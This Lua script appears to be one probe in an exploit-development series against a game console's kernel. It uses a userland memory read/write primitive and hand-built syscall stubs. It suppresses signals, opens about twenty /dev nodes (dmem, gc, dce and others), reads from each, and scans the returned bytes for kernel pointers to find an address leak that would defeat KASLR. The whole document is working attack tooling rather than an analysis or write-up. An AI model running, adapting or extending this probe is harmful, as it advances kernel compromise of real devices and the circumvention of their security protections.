-- CRASH_CLASS: MODERATE
-- PROBE 399b: Systematic read() on all open /dev nodes
--
-- ioctl sweep was exhaustive (387a/387c) but read(fd, buf, N) was never
-- tested on most device nodes. Device d_read handlers can return data
-- completely separate from ioctl. Check for kernel pointers in output.

print("=== PROBE 399b: /dev node read sweep ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

-- Ignore SIGSYS
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
-- Ignore SIGPIPE
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local sc_open = mk(5)
local sc_read = mk(3)
local sc_close = mk(6)

local buf = memory.alloc(0x1000)
local READ_SZ = 0x1000

-- Devices from the inventory (259a-268a) that opened successfully
local devices = {
    "/dev/gc",
    "/dev/dce",
    "/dev/ajm",
    "/dev/dmem0",
    "/dev/dmem1",
    "/dev/dmem2",
    "/dev/camera",
    "/dev/usb",
    "/dev/usbctl",
    "/dev/hid",
    "/dev/bt",
    "/dev/rng",
    "/dev/gic",
    "/dev/notification0",
    "/dev/notification1",
    "/dev/notification2",
    "/dev/notification3",
    "/dev/notification4",
    "/dev/notification5",
    "/dev/null",
    "/dev/zero",
    "/dev/urandom",
}

print(string.format("testing %d devices, read_sz=0x%X", #devices, READ_SZ))
print("")

local total_kptr = 0
local data_devices = 0

for _, devpath in ipairs(devices) do
    -- Allocate path string
    local pathbuf = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(pathbuf) + i, 0) end
    for i = 1, #devpath do
        local off = N(pathbuf) + i - 1
        local byte = string.byte(devpath, i)
        -- Write byte by byte via dword read-modify-write
        local cur = rd(off - (off % 4)) or 0
        local shift = (off % 4) * 8
        cur = cur - (cur % (2^(shift+8))) + (cur % (2^shift)) + byte * (2^shift)
        wd(off - (off % 4), cur)
    end

    -- Open O_RDONLY (0) and O_RDWR (2)
    local modes = {
        {0, "RO"},
        {2, "RW"},
    }

    for _, mode in ipairs(modes) do
        local ok_open, fd_val = pcall(function()
            return sc_open(uint64(N(pathbuf)), uint64(mode[1]), uint64(0))
        end)
        local fd = ok_open and N(fd_val) or -1
        if fd < 0 or fd > 10000 then fd = -1 end

        if fd >= 0 then
            -- Fill buffer with sentinel
            for i = 0, READ_SZ - 4, 4 do wd(N(buf) + i, 0xDEADDEAD) end

            -- Set non-blocking via fcntl to avoid hanging on blocking reads
            pcall(function()
                mk(92)(uint64(fd), uint64(4), uint64(0x0004))  -- F_SETFL, O_NONBLOCK
            end)

            -- Try read
            local ok_rd, rv_rd = pcall(function()
                return sc_read(uint64(fd), uint64(N(buf)), uint64(READ_SZ))
            end)
            local bytes = ok_rd and N(rv_rd) or -1
            -- Handle -1 as unsigned
            if bytes > 0x7FFFFFFF then bytes = -1 end

            if bytes > 0 then
                data_devices = data_devices + 1
                -- Scan for kernel pointers
                local local_kptr = 0
                local first_kptr_off = -1
                local first_kptr_val = 0
                local nonzero = 0

                for i = 0, bytes - 4, 4 do
                    local v = rd(N(buf) + i) or 0
                    if v ~= 0 and v ~= 0xDEADDEAD then
                        nonzero = nonzero + 1
                        local h = math.floor(v / 0x10000)
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            local_kptr = local_kptr + 1
                            total_kptr = total_kptr + 1
                            if first_kptr_off < 0 then
                                first_kptr_off = i
                                first_kptr_val = v
                            end
                        end
                    end
                end

                -- Also check qword-aligned for full 64-bit kernel pointers
                local kptr64 = 0
                for i = 0, bytes - 8, 8 do
                    local lo = rd(N(buf) + i) or 0
                    local hi = rd(N(buf) + i + 4) or 0
                    if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF and lo ~= 0 then
                        kptr64 = kptr64 + 1
                    end
                end

                print(string.format("%s(%s) fd=%d bytes=%d nz=%d kptr32=%d kptr64=%d",
                    devpath, mode[2], fd, bytes, nonzero, local_kptr, kptr64))

                if local_kptr > 0 or kptr64 > 0 then
                    print(string.format("  ★ KPTR at +%X = %08X", first_kptr_off, first_kptr_val))
                end

                -- Dump first 64 bytes of data
                if bytes <= 256 or local_kptr > 0 or kptr64 > 0 then
                    local dump = "  "
                    local limit = math.min(bytes, 64)
                    for i = 0, limit - 4, 4 do
                        local v = rd(N(buf) + i) or 0
                        dump = dump .. string.format("%08X ", v)
                    end
                    print(dump)
                end
            end

            pcall(function() sc_close(uint64(fd)) end)
        end

        if not alive() then print("CANARY FAIL " .. devpath); return end
    end
end

print("")
print(string.format("RESULT: data_devices=%d total_kptr=%d", data_devices, total_kptr))
if total_kptr > 0 then
    print("★★★ KERNEL POINTERS FOUND IN DEVICE READ ★★★")
end

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 399b COMPLETE ===")
